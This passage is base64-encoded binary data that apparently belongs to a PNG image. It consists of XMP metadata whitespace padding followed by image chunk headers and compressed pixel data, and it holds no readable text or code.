gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Po5KLu8AAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADqYAAAOpgAABdvkl/FRgABGcJJREFUeNqUlWtQlOcdxX/v7rsLC5EFL8sKzaDiQKoIGUqtBqUiwRCZqEQsRLMwjRYdLoFOCSI7oLZKEmrqpFgJTElBqyAWJ2qFKl4wkgTlFoqCF9REUlgwXdgNsCx7efuBqa3Vtsn59jwfnvOc+Z/zPyL/Bg8PD8xm82Nnb29vNBoNCoXCNSgo6IRWq31BEIT9Go1mt9PpZPbs2djtdkwmExMTE8yYMQM/Pz/sdjsAIv8DMpmssaCg4McbN27Ebrdz+vRpent72bZt2y6LxbLr1q1bFBQUkJ+frzWZTINPe+O/EcQMDAzUazQa7t+/T3l5OT4+PhiNRioqKuju7iY5ORmZTEZJSQlDQ0OGM2fOEBUVJfxfAq1WK929exd3d3eqq6upq6tDp9NRXl7OT17bwgdlFTzoG6CysgKdLomQkBDq6+sJCgrCbDZLvr6+s4Cvn0qQn5/vSE9Pp6qqioaGBhQKBSlb0wifuZOYmrNUV1ezeIEH17rNKBUyKvVDnGvsYHL0b4SFhZGYmMiOHTse+vv7K0dGRmyPESQkJORlZGTINm/ezJEjR3j55Rjq3nUgBDc8pvCoXsP8TWYmbU6EwLPAWaSrP6C8K5XU1FQKCwsxmUyT8fHxAoAoilMcer1+b1JSEmlpaVgs49TutyL4/eXJ6Qj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